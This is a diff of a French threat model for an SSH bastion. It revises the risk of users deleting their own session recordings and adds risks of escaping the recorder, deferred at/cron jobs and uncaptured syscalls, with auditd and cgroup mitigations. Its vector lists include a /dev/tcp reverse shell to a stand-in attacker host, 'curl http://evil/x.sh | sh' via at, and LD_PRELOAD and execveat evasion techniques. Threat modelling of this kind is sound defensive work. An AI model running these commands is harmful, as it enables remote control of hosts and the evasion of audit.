@@ -1011,7 +1011,7 @@ L'escalade sudo est bloquée par conception :
 
 **Séparation des privilèges pour l'enregistrement de session :**
 
-L'enregistrement de session utilise un wrapper setgid (`ob-session-recorder-wrapper`) appartenant au groupe `ob-sessions`. Le répertoire `/var/lib/open-bastion/sessions` a les permissions `1770` avec ce groupe. Cette séparation garantit que les utilisateurs ne peuvent ni lire ni supprimer leurs propres enregistrements de session, réduisant le risque de falsification de preuves en cas de compromission d'une session.
+L'enregistrement de session utilise un wrapper setgid (`ob-session-recorder-wrapper`) appartenant au groupe `ob-sessions`. Le répertoire `/var/lib/open-bastion/sessions` a les permissions `1770` avec ce groupe. Cette séparation garantit que les utilisateurs ne peuvent **ni lire ni supprimer les enregistrements des autres utilisateurs** (isolation latérale). En revanche, l'utilisateur reste propriétaire de son propre sous-répertoire `2770 user:ob-sessions` et peut donc supprimer ses propres enregistrements — voir R-S18 ci-dessous pour le détail et les protections complémentaires (syslog `auth.info`, watch auditd).
 
 |                 |                 Score résiduel                  |
 | --------------- | :---------------------------------------------: |
@@ -1101,17 +1101,16 @@ L'enregistrement de session utilise un wrapper setgid (`ob-session-recorder-wrap
 
 |                 | Score |
 | --------------- | :---: |
-| **Probabilité** |   3   |
+| **Probabilité** |   2   |
 | **Impact**      |   3   |
 
-**Description :** Un utilisateur malveillant ou un attaquant ayant compromis une session SSH efface ou modifie les fichiers d'enregistrement de session (typescript, métadonnées) pour dissimuler ses actions. Si les fichiers de session sont créés avec les droits de l'utilisateur (propriétaire = utilisateur), celui-ci peut les supprimer librement.
+**Description :** Un utilisateur malveillant ou un attaquant ayant compromis une session SSH efface ou modifie les fichiers d'enregistrement de session (typescript, métadonnées) pour dissimuler ses actions. Le wrapper setgid crée le sous-répertoire utilisateur en mode `2770 user:ob-sessions` : **l'utilisateur en est propriétaire** et dispose donc des permissions `wx` sur ce sous-répertoire, ce qui lui permet de faire `unlink` de ses propres fichiers de session via `rm`. Le sticky bit du parent `/var/lib/open-bastion/sessions` (mode `1770 root:ob-sessions`) protège uniquement le sous-répertoire utilisateur lui-même contre la suppression, **pas les fichiers à l'intérieur**.
 
 **Conditions de la menace :**
 
 1. L'utilisateur a une session SSH active (authentifié par certificat + autorisé par PAM)
-2. Le session recorder (`ForceCommand`) crée les fichiers sous l'identité de l'utilisateur
-3. L'utilisateur a accès en écriture au répertoire de sessions
-4. Aucune protection n'empêche la suppression ou modification des fichiers
+2. Le session recorder (`ForceCommand`) crée les fichiers dans un sous-répertoire dont l'utilisateur est propriétaire (`2770 user:ob-sessions`)
+3. L'utilisateur a accès en écriture au sous-répertoire et est propriétaire des fichiers de session
 
 **Vecteurs :**
 
@@ -1119,31 +1118,166 @@ L'enregistrement de session utilise un wrapper setgid (`ob-session-recorder-wrap
 - Modification du contenu (troncature, réécriture) pour masquer des commandes
 - Suppression des métadonnées JSON pour effacer les traces d'activité
 
-**Conséquence :** Perte de traçabilité des actions effectuées sur le serveur. En cas d'incident de sécurité, l'absence d'enregistrement empêche l'analyse forensique et l'imputation des actions.
+**Conséquence :** Perte du replay visuel de la session. La timeline (start/end, identifiant utilisateur) reste cependant traçable via syslog `auth.info`, et l'événement d'effacement lui-même peut être tracé si la trace auditd primaire est activée.
 
-**Remédiation implémentée — Séparation des privilèges par wrapper setgid :**
+**Remédiations en place :**
 
-Le session recorder utilise un wrapper C setgid (`ob-session-recorder-wrapper`) appartenant au groupe `ob-sessions` :
+1. **Wrapper setgid `ob-session-recorder-wrapper`** : empêche l'utilisateur d'**accéder aux recordings d'autres utilisateurs**. C'est la propriété principale réellement obtenue par le mécanisme setgid : isolation latérale entre utilisateurs, et non immutabilité des fichiers de l'utilisateur courant. Cette propriété reste valable et utile.
+2. **Sanitisation de l'environnement** (LD_PRELOAD, BASH_ENV, PATH durci) avant exec du script de session : empêche les vecteurs d'évasion via préchargement de bibliothèque.
+3. **Syslog `auth.info`** : le session recorder émet à l'ouverture une ligne `Session <UUID> started for user <user> from <ip>` et à la clôture `Session <UUID> ended for user <user> (status: <status>)` (cf. `scripts/ob-session-recorder:200,383`). Ce journal est root-owned et indépendant des fichiers de recording — il n'est pas accessible en écriture à l'utilisateur. Même si l'utilisateur supprime ses fichiers de session, ces deux lignes conservent la trace de l'ouverture et de la fermeture de la session, suffisante pour l'imputation temporelle.
+4. **Watch auditd `-w /var/lib/open-bastion/sessions/ -p wa`** (PR2 #113, opt-in via `--enable-audit-trace`) : trace tout `unlink`, `truncate` ou `rename` sur les fichiers de session, **même si l'effacement réussit**. L'événement d'effacement devient lui-même une preuve d'audit.
 
-1. Le binaire wrapper est installé en mode `2755 root:ob-sessions` (bit setgid)
-2. Le wrapper utilise son gid effectif `ob-sessions` **uniquement** pour créer le sous-répertoire utilisateur en mode `2770 user:ob-sessions` (bit setgid sur le répertoire)
-3. Le wrapper drop explicitement le gid élevé via `setregid(orig_gid, orig_gid)` avant l'exec. `exec` ne supprime **pas** un gid effectif/sauvé déjà acquis (seuls les bits setgid du _fichier_ exécuté sont ignorés). Le drop explicite garantit que le script et le shell tournent avec le gid original de l'utilisateur
-4. Le répertoire `/var/lib/open-bastion/sessions` a les permissions `1770 root:ob-sessions` :
-   - `1` (sticky bit) : seul le propriétaire du répertoire (root) peut supprimer les fichiers
-   - `770` : seuls root et le groupe `ob-sessions` peuvent accéder au répertoire
-5. Les fichiers de session héritent du groupe `ob-sessions` grâce au bit setgid du sous-répertoire utilisateur (mode `2770`), sans que le processus ait besoin du gid élevé
-6. L'environnement est sanitisé (LD_PRELOAD, BASH_ENV, PATH durci) avant l'exec
+**Pistes non retenues :**
 
-**Résultat :** L'utilisateur ne peut ni lire, ni modifier, ni supprimer les fichiers d'enregistrement de session depuis son shell.
+- **Démon collecteur privilégié** (fichiers root-owned via fd-passing sur socket Unix) : architecture la plus robuste mais introduit un nouveau service permanent et un canal IPC privilégié. Discutée en brainstorm initial mais écartée à ce stade.
+- **Binaire setuid root** dédié à la création de fichiers root-owned : écarté en raison de la préférence projet pour ne pas multiplier les binaires setuid root sur le bastion.
 
-**Protection complémentaire — Syslog :**
+Voir [R-S18 dans 99-risk-reduce.md](99-risk-reduce.md) pour les pistes d'amélioration permettant de redescendre P à 1 sans setuid.
 
-Le session recorder enregistre les événements de début/fin de session dans syslog (`auth.info`), qui constitue un journal d'audit indépendant et résistant à la falsification par l'utilisateur (syslog est protégé par les droits root).
+|                 |                                       Score résiduel                                       |
+| --------------- | :----------------------------------------------------------------------------------------: |
+| **Probabilité** |                      2 (suppression triviale via `rm` reste possible)                      |
+| **Impact**      | 1 (syslog `auth.info` + watches auditd préservent la timeline et l'événement d'effacement) |
 
-|                 |                           Score résiduel                           |
-| --------------- | :----------------------------------------------------------------: |
-| **Probabilité** | 1 (setgid wrapper + sticky bit + syslog comme journal indépendant) |
-| **Impact**      |              1 (syslog préserve les traces minimales)              |
+---
+
+### R-S19 - Évasion du containment de session (orphelin détaché)
+
+|                 | Score |
+| --------------- | :---: |
+| **Probabilité** |   3   |
+| **Impact**      |   3   |
+
+**Description :** Un utilisateur connecté SSH peut détacher un processus de l'enregistreur via `setsid`+`nohup` et redirection complète des descripteurs de fichiers (`</dev/null >/dev/null 2>&1`). Une fois détaché, le processus survit à un `kill` du recorder ou à la fin normale de session. Variante : reverse shell où l'attaquant pilote la machine depuis l'extérieur sans rien taper dans le pty enregistré.
+
+**Conditions de la menace :**
+
+1. L'utilisateur a une session SSH ouverte
+2. Le recorder tourne avec le même UID que l'utilisateur (architecturalement nécessaire pour le pty)
+3. `KillUserProcesses=no` (défaut sur de nombreuses distributions)
+
+**Vecteurs :**
+
+- `setsid nohup bash -c '<malicious>' </dev/null >/dev/null 2>&1 &` puis `pkill -KILL -u $UID script`
+- Reverse shell : `setsid nohup bash -c 'bash -i </dev/tcp/attacker/4444 1>&0 2>&0' </dev/null >/dev/null 2>&1 &`
+- Job en arrière-plan détaché qui survit à la déconnexion (sans même tuer le recorder)
+
+**Conséquence :** Actions persistantes ou pilotées depuis l'extérieur sans qu'aucune trace pty ne soit capturée. Le replay de session ne reflète pas l'activité réelle de l'utilisateur sur le bastion.
+
+**Remédiation implémentée — Containment cgroup (PR1 #112, opt-in via `--enable-hardening`) :**
+
+- `KillUserProcesses=yes` dans `/etc/systemd/logind.conf.d/open-bastion.conf` : à la fin de la session SSH, `logind` tue tout le cgroup utilisateur, **y compris les processus détachés via `setsid`** (qui restent dans le même cgroup même si la session POSIX change). `setsid` ne crée pas un nouveau cgroup ; seul `unshare --cgroup` ou des privilèges `CAP_SYS_ADMIN` permettraient l'évasion cgroup, ce qui n'est pas accessible à un utilisateur non privilégié.
+- Pre-flight refusant l'activation du hardening si un utilisateur non-root a `Linger=yes` (cf. R-S20 pour le canal `systemd-run --user --on-active=...`).
+- Limite `nproc` (defense in depth contre fork-bomb pendant la session).
+
+**Remédiation complémentaire — Trace primaire auditd (PR2 #113, opt-in via `--enable-audit-trace`) :**
+
+- Règles `-S execve -S execveat` dans `/etc/audit/rules.d/open-bastion.rules` : chaque commande lancée par le processus détaché laisse une trace indépendante du recorder pty, attribuée à l'UID de l'utilisateur (champ `uid=` du record auditd).
+
+|                 |                                  Score résiduel (PR1 + PR2 activées)                                   |
+| --------------- | :----------------------------------------------------------------------------------------------------: |
+| **Probabilité** | 1 (`KillUserProcesses=yes` ferme le canal d'évasion principal ; auditd ferme la trace de seconde main) |
+| **Impact**      |            1 (orphelins tués à la déconnexion ; commandes tracées syscall-level par auditd)            |
+
+> **Score résiduel si PR1 NON activée :** P=3, I=3 (zone jaune). Le hardening doit être documenté comme **fortement recommandé** sur tout déploiement bastion réel. Voir [doc/hardening.md](../hardening.md) pour les détails techniques (documentation technique en anglais).
+
+---
+
+### R-S20 - Action différée hors session (at, cron, systemd-run timer)
+
+|                 | Score |
+| --------------- | :---: |
+| **Probabilité** |   2   |
+| **Impact**      |   3   |
+
+**Description :** Un utilisateur soumet une commande au planificateur du système (`at`, `crontab`, ou `systemd-run --user --on-active=...` si linger activé). La commande s'exécute **après** la déconnexion, donc hors session SSH, hors enregistrement pty, et hors cgroup affecté par `KillUserProcesses=yes` (R-S19). Le containment cgroup est inopérant contre ce vecteur car le travail planifié est démarré par un processus système (atd, cron, systemd-user manager) dans son propre cgroup.
+
+**Conditions de la menace :**
+
+1. `at` ou `cron` autorisent les non-root (défaut sur Debian)
+2. `atd` est actif
+3. (Variante systemd-run timer) l'utilisateur a `Linger=yes`
+
+**Vecteurs :**
+
+- `echo 'curl http://evil/x.sh | sh' | at now + 1 hour`
+- `crontab -e` puis `*/5 * * * * exfil_data.sh`
+- `loginctl enable-linger; systemd-run --user --on-active=10min /tmp/x.sh` (si linger autorisé)
+
+**Conséquence :** Action différée non tracée par le recorder, persistant après déconnexion. Si l'attaquant a planifié sa commande puis s'est déconnecté, plus rien dans le pty ne le rattache à l'exécution effective. L'imputation reste possible uniquement via les traces du planificateur et, si activé, via auditd.
+
+**Remédiation implémentée — Désactivation des planificateurs utilisateur (PR1 #112, opt-in via `--enable-hardening`) :**
+
+- `/etc/at.allow` vide (root only) + `systemctl mask atd` : `at(1)` est désactivé pour les non-root et le démon `atd` ne tourne plus.
+- `/etc/cron.allow` root-only : `crontab(1)` refuse les non-root au moment de l'édition. `cron.service` reste actif parce que `/etc/cron.d/open-bastion-krl` (utilisé par le mode max-security pour le rafraîchissement de la KRL) requiert un démon cron en service. `cron.allow` empêche les utilisateurs de soumettre leurs propres crontabs ; les fichiers déposés dans `/etc/cron.d/` restent root-only par construction.
+- Pre-flight bloquant : `setup_hardening` **refuse de s'exécuter** si un utilisateur non-root a `Linger=yes`. L'administrateur doit faire `loginctl disable-linger <user>` avant. Cette protection ferme le canal `systemd-run --user --on-active=...`.
+
+**Remédiation complémentaire — Trace primaire auditd (PR2 #113) :**
+
+Au moment de l'exécution effective de la commande planifiée (si la planification est passée à travers les protections ci-dessus), auditd la capture via `-S execve -S execveat`. L'événement est attribué au démon planificateur (PID, parent, uid effectif) et reste corrélable.
+
+**Limite résiduelle documentée :** Un crontab pré-existant déposé dans `/var/spool/cron/crontabs/<user>` **avant** l'activation du hardening n'est pas purgé par `setup_hardening`. `cron` lit le spool indépendamment de `cron.allow` (qui ne contrôle que `crontab(1)` au moment de l'édition). Voir [99-risk-reduce.md](99-risk-reduce.md) pour la piste d'amélioration (purge des crontabs pré-existants à l'activation du hardening).
+
+|                 |                                  Score résiduel (PR1 activée)                                  |
+| --------------- | :--------------------------------------------------------------------------------------------: |
+| **Probabilité** |            1 (at masqué, cron en allow-list root, linger refusé par le pre-flight)             |
+| **Impact**      | 2 (limite documentée : crontab pré-existant non purgé ; auditd trace tout de même l'exécution) |
+
+> **Score résiduel si PR1 NON activée :** P=2, I=3 (zone jaune). Voir [doc/hardening.md](../hardening.md) pour les détails techniques (documentation technique en anglais).
+
+---
+
+### R-S21 - Action non capturée par l'enregistreur sans tuer le recorder
+
+|                 | Score |
+| --------------- | :---: |
+| **Probabilité** |   2   |
+| **Impact**      |   3   |
+
+**Description :** Même avec le recorder actif et la session ouverte, certaines actions ne passent pas par le pty et ne sont donc pas capturées par `script(1)`. Cas typiques :
+
+- I/O sur des descripteurs de fichiers redirigés (socket réseau, fichier, mémoire) qui contournent le pty
+- Commandes lancées via `execveat` (syscall #322 sur x86_64) au lieu d'`execve` — non tracées par défaut par auditd si seul `execve` est dans les règles
+- Exfiltration UDP via `sendto` sur socket non-connectée — non tracée par `connect()`
+- Opérations `io_uring` qui contournent les syscalls classiques
+
+Contrairement à R-S19 (recorder tué) et R-S20 (action différée), ici le recorder est vivant et la session est ouverte : c'est la **nature du syscall** qui rend l'action invisible au pty.
+
+**Conditions de la menace :**
+
+1. Recorder actif et fonctionnel (cf. R-S19 pour le cas où il est tué)
+2. Utilisateur connaît la technique (informaticien expérimenté ou attaquant motivé)
+
+**Vecteurs :**
+
+- Petit programme C/Python qui appelle `syscall(SYS_execveat, ...)` pour spawner un shell hors trace `execve`
+- Reverse shell où le pty enregistre seulement la commande de lancement, puis l'attaquant pilote depuis l'extérieur (la session continue mais le canal de pilotage est invisible)
+- Exfiltration DNS via UDP `sendto` non-connecté
+- `TIOCSTI` ioctl pour injecter de l'input dans le tty parent ou un autre tty appartenant au même utilisateur (mitigé par défaut sur Linux ≥ 6.2 via `dev.tty.legacy_tiocsti_restrict=1`, mais à vérifier sur les hosts plus anciens)
+- `ptrace`/`PTRACE_ATTACH` sur un autre processus de l'utilisateur pour injecter du code dans un process non recordé (mitigé par défaut sur Debian/Ubuntu via `kernel.yama.ptrace_scope=1`, qui restreint `ptrace` au lien parent-enfant direct)
+- `LD_PRELOAD` _à l'intérieur_ de la session (la sanitisation du wrapper ne couvre que le **lancement** du recorder, pas les commandes que l'utilisateur exécute ensuite). Exemple : `LD_PRELOAD=./evil.so /usr/bin/somecmd` pour intercepter ce que `somecmd` fait. Le pty enregistre le préfixe `LD_PRELOAD=…` mais pas les effets de la lib injectée.
+
+**Conséquence :** Le recording pty ne reflète pas la totalité des actions de la session. Limite la valeur forensique du replay et l'imputation.
+
+**Remédiation implémentée — Trace primaire auditd (PR2 #113, opt-in via `--enable-audit-trace`) :**
+
+- Règles `-S execve -S execveat` : les **deux** syscalls sont couverts → `execveat` ne contourne plus la trace (correctif issu de la review sécurité de PR2 ; n'inclure qu'`execve` était insuffisant).
+- Watch `-w /var/lib/open-bastion/sessions/ -p wa` : toute tentative de modifier ou supprimer un recording est tracée même si l'effacement réussit (cf. R-S18).
+- `connect()` tracé pour les sockets connectées (TCP, sockets Unix connectées, UDP « connectées » — c'est-à-dire après un `connect(AF_INET, SOCK_DGRAM)`).
+- Watches sur les fichiers sensibles (`/etc/passwd`, `/etc/shadow`, `/etc/group`, `/etc/sudoers`, `/etc/ssh/sshd_config`, `/etc/open-bastion/`) : toute modification est imputable au PID/UID/PPID qui l'a provoquée.
+
+**Limites résiduelles documentées dans [doc/audit.md](../audit.md) (documentation technique en anglais) :**
+
+- `sendto`/`sendmsg` UDP non-connectées non tracées par défaut (la volumétrie serait excessive). Extension opt-in documentée : ajouter `-S sendto -S sendmsg` à `/etc/audit/rules.d/open-bastion.rules`.
+- `io_uring_enter` non tracé (rare en pratique). Mêmes considérations de volumétrie.
+- Contenu des fichiers et des buffers réseau non capturé : auditd trace les **syscalls et leurs métadonnées** (uid, ppid, cwd, args), pas les données échangées.
+
+|                 |                                          Score résiduel (PR2 activée)                                          |
+| --------------- | :------------------------------------------------------------------------------------------------------------: |
+| **Probabilité** |    1 (`execve`/`execveat` couverts, watches sur `/etc` et `sessions/`, `connect()` TCP/UDP-connect tracés)     |
+| **Impact**      | 2 (`sendto` UDP non-connecté reste un canal d'exfil non tracé par défaut → DNS-tunnel possible mais documenté) |
+
+> **Score résiduel si PR2 NON activée :** P=2, I=3 (zone jaune). L'enregistrement pty seul ne suffit pas comme preuve d'audit primaire : la trace auditd est **fortement recommandée** en complément. Voir [doc/audit.md](../audit.md) pour les détails techniques (documentation technique en anglais).
 
 ---
 
@@ -1151,23 +1285,23 @@ Le session recorder enregistre les événements de début/fin de session dans sy
 
 ### Avant remédiation
 
-| Impact ↓ / Probabilité → | 1 - Très improbable | 2 - Peu probable                  | 3 - Probable | 4 - Très probable |
-| ------------------------ | ------------------- | --------------------------------- | ------------ | ----------------- |
-| **4 - Critique**         | R-S4                | R-S6 R-S17                        |              |                   |
-| **3 - Important**        |                     | R-S3 R-S7 R-S11 R-S15 R-S13 R-S14 | R-S18        |                   |
-| **2 - Limité**           | R-S16               | R-S9 R-S10 R-S12                  | R-S8         |                   |
-| **1 - Négligeable**      |                     |                                   |              |                   |
+| Impact ↓ / Probabilité → | 1 - Très improbable | 2 - Peu probable                                    | 3 - Probable | 4 - Très probable |
+| ------------------------ | ------------------- | --------------------------------------------------- | ------------ | ----------------- |
+| **4 - Critique**         | R-S4                | R-S6 R-S17                                          |              |                   |
+| **3 - Important**        |                     | R-S3 R-S7 R-S11 R-S15 R-S13 R-S14 R-S18 R-S20 R-S21 | R-S19        |                   |
+| **2 - Limité**           | R-S16               | R-S9 R-S10 R-S12                                    | R-S8         |                   |
+| **1 - Négligeable**      |                     |                                                     |              |                   |
 
-> **Note :** R-S1 (brute-force mot de passe) et R-S2 (vol de clé SSH simple) sont **éliminés** par la cible de sécurité maximale (`AuthorizedKeysFile none` + certificat CA requis). R-S5 démarre à P=1 grâce aux certificats CA obligatoires.
+> **Note :** R-S1 (brute-force mot de passe) et R-S2 (vol de clé SSH simple) sont **éliminés** par la cible de sécurité maximale (`AuthorizedKeysFile none` + certificat CA requis). R-S5 démarre à P=1 grâce aux certificats CA obligatoires. R-S18 est ici à P=2 (et non P=3) car le wrapper setgid empêche l'accès aux recordings d'autres utilisateurs, ce qui réduit la probabilité d'un effacement « croisé » même avant remédiation complète ; l'effacement de ses propres recordings reste possible (cf. fiche R-S18).
 
 ### Après remédiation complète
 
-| Impact ↓ / Probabilité → | 1 - Très improbable                                 | 2 - Peu probable | 3 - Probable | 4 - Très probable |
-| ------------------------ | --------------------------------------------------- | ---------------- | ------------ | ----------------- |
-| **4 - Critique**         | R-S4                                                |                  |              |                   |
-| **3 - Important**        | R-S5                                                | R-S6             |              |                   |
-| **2 - Limité**           | R-S7 R-S9 R-S10 R-S11 R-S12 R-S13 R-S14 R-S16 R-S17 | R-S8             |              |                   |
-| **1 - Négligeable**      | R-S15 R-S18                                         | R-S3             |              |                   |
+| Impact ↓ / Probabilité → | 1 - Très improbable                                             | 2 - Peu probable | 3 - Probable | 4 - Très probable |
+| ------------------------ | --------------------------------------------------------------- | ---------------- | ------------ | ----------------- |
+| **4 - Critique**         | R-S4                                                            |                  |              |                   |
+| **3 - Important**        | R-S5                                                            | R-S6             |              |                   |
+| **2 - Limité**           | R-S7 R-S9 R-S10 R-S11 R-S12 R-S13 R-S14 R-S16 R-S17 R-S20 R-S21 | R-S8             |              |                   |
+| **1 - Négligeable**      | R-S15 R-S19                                                     | R-S3 R-S18       |              |                   |
 
 **Profil de risque de la cible maximale :**
 
@@ -1178,8 +1312,10 @@ Le session recorder enregistre les événements de début/fin de session dans sy
 - R-S15 (KRL stale) : **I=1** grâce au binding fingerprint sur `/pam/authorize` : une révocation LLNG interdit l'ouverture d'une session SSH à chaque nouvelle connexion, indépendamment de la fraîcheur de la KRL
 - R-S16 (escalade sudo) : **contrôlé par réauthentification SSO obligatoire**
 - R-S17 (lockout) : **contrôlé par compte de service secours** + procédure console documentée
-- R-S18 (effacement sessions) : **contrôlé par wrapper setgid** + sticky bit + syslog indépendant
-- Seuls risques résiduels significatifs : R-S4 (CA compromise) et R-S6 (bastion compromis)
+- R-S18 (effacement sessions) : **traçable mais reste effaçable techniquement** ; l'imputation tient grâce à syslog `auth.info` (start/end de session) et, si PR2 (#113) est activée, grâce au watch auditd `-w /var/lib/open-bastion/sessions/` qui trace l'événement d'effacement lui-même
+- R-S19 (évasion containment via `setsid`/`nohup`), R-S20 (action différée via `at`/`cron`/`systemd-run`), R-S21 (action non capturée par le pty) : **nouvellement identifiés** et mitigés par PR1 (#112) et PR2 (#113) sous condition d'activation opt-in
+- **Conditions d'activation :** ces nouveaux risques (R-S19, R-S20, R-S21) ne sont mitigés à leur niveau résiduel **que si** le hardening (PR1) ET la trace auditd (PR2) sont activés via `ob-bastion-setup --enable-hardening --enable-audit-trace`. En l'absence d'activation, ces risques restent en zone jaune (P=3, I=3 pour R-S19 ; P=2, I=3 pour R-S20 et R-S21). Voir [doc/hardening.md](../hardening.md) et [doc/audit.md](../audit.md) (documentations techniques en anglais) pour les détails opérationnels.
+- Seuls risques résiduels significatifs en zone jaune (PR1 et PR2 activées) : R-S4 (CA compromise) et R-S6 (bastion compromis)
 
 ---
 
